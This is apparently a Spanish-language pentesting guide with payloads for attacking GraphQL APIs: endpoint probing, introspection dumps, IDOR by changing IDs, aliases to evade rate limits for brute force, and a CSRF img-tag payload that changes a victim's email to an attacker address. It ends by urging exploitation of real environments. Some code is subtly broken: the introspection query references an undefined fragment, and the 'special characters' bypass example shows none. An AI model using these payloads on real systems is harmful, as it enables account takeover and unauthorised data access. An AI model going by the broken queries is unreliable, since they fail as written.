# 🧖‍♂️ Real World Payloads

## Ataques a APIs GraphQL: Guía Práctica para Entornos Reales

### **Descubriendo Endpoints de GraphQL**

Antes de comenzar a atacar una API GraphQL, lo primero es identificar su endpoint. Los endpoints de GraphQL suelen ser únicos y reutilizables para todas las consultas y mutaciones, lo que los hace un objetivo clave.

#### **1. Métodos para Identificar Endpoints**

**Nombres Comunes de Endpoints**

Prueba con rutas comunes donde suelen encontrarse los endpoints de GraphQL:

* `/graphql`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`
* Agrega `/v1`, `/v2` para probar versiones.

**Consultas Universales**

Envíe la siguiente consulta universal para verificar si una URL es un endpoint de GraphQL:

```json
{
  "query": "{__typename}"
}
```

**Respuesta esperada:**

```json
{
  "data": {
    "__typename": "Query"
  }
}
```

Esto indica que la URL pertenece a un servicio GraphQL.

**Errores Comunes Indicativos**

Busca mensajes como `"query not present"` o `"Bad Request"` al enviar solicitudes mal formadas. Estos mensajes sugieren que el endpoint podría ser un GraphQL mal configurado.

#### **2. Métodos HTTP**

* **POST con `Content-Type: application/json`**: El más común.
* **GET**: Aunque menos seguro, algunos endpoints lo permiten.
* **POST con `x-www-form-urlencoded`**: Usado en configuraciones inseguras.

#### **Ejemplo Práctico**

1. Envíe una solicitud a `/graphql/v1`:

```json
{
  "query": "{__typename}"
}
```

2. Si responde con un error como `"Method Not Allowed"`, cambie el método a `POST` y agregue el encabezado:

```
Content-Type: application/json
```

3. Use herramientas como Burp Suite para automatizar pruebas y guardar respuestas.

***

### **Introspección en GraphQL**

La introspección permite consultar el esquema completo de una API GraphQL, revelando detalles sobre consultas, mutaciones y tipos.

#### **1. Consultas de Introspección**

**Consulta Básica**

```json
{
  "query": "{__schema { queryType { name } }}"
}
```

**Consulta Completa**

```json
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  name
  fields(includeDeprecated: true) {
    name
    type {
      name
    }
  }
}
```

#### **2. Visualización del Esquema**

Utiliza herramientas como [GraphQL Voyager](https://apis.guru/graphql-voyager/) para convertir las respuestas JSON en representaciones gráficas interactivas.

***

### **Explotación de Vulnerabilidades en GraphQL**

#### **1. Ataques IDOR (Referencias a Objetos Directos Inseguras)**

**Escenario**

Supongamos que una API permite consultar productos mediante una ID:

**Consulta Válida:**

```graphql
query {
  product(id: 1) {
    name
    price
  }
}
```

**Respuesta:**

```json
{
  "data": {
    "product": {
      "name": "Producto 1",
      "price": 100
    }
  }
}
```

Modifique la ID para acceder a recursos no autorizados:

```graphql
query {
  product(id: 999) {
    name
    price
  }
}
```

#### **2. Alias para Evadir Límites de Tasa**

Los alias permiten realizar múltiples consultas en una sola solicitud, evadiendo limitadores de solicitudes HTTP:

```graphql
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  user3: user(id: 3) { name }
}
```

**Impacto:**

* Realiza ataques de fuerza bruta contra IDs de usuarios o códigos promocionales.

***

### **Cross-Site Request Forgery (CSRF) en GraphQL**

Cuando los endpoints de GraphQL no implementan protecciones adecuadas, son susceptibles a ataques CSRF.

#### **Ejemplo**

Un atacante crea una consulta para cambiar el correo electrónico del usuario:

```graphql
mutation {
  updateEmail(email: "attacker@example.com") {
    success
  }
}
```

**Carga Maliciosa**

El atacante inserta esta consulta en un sitio malicioso:

```html
<img src="https://victima.com/graphql?query=mutation%7BupdateEmail(email%3A%22attacker%40example.com%22)%7Bsuccess%7D%7D" />
```

#### **Mitigaciones**

1. Exigir tokens CSRF únicos.
2. Validar encabezados `Origin` y `Referer`.
3. Configurar cookies con `SameSite=Strict`.

***

### **Evadiendo Defensas de Introspección**

Si la introspección está deshabilitada, prueba las siguientes técnicas:

1. **Manipulación de `__schema`**

Agrega caracteres especiales:

```graphql
{
  query { __schema { queryType { name } }}
}
```

2. **Métodos HTTP Alternativos**

*   Solicitudes `GET`:

    ```http
    GET /graphql?query=query%7B__schema%7BqueryType%7Bname%7D%7D
    ```
* Cambiar el tipo de contenido a `text/plain` o `application/x-www-form-urlencoded`.

***

### **Conclusión**

La explotación de APIs GraphQL requiere un enfoque creativo y persistente, aprovechando configuraciones incorrectas y vulnerabilidades comunes. Con herramientas como Burp Suite y técnicas avanzadas de evasión, puedes identificar y explotar fallos en entornos reales.
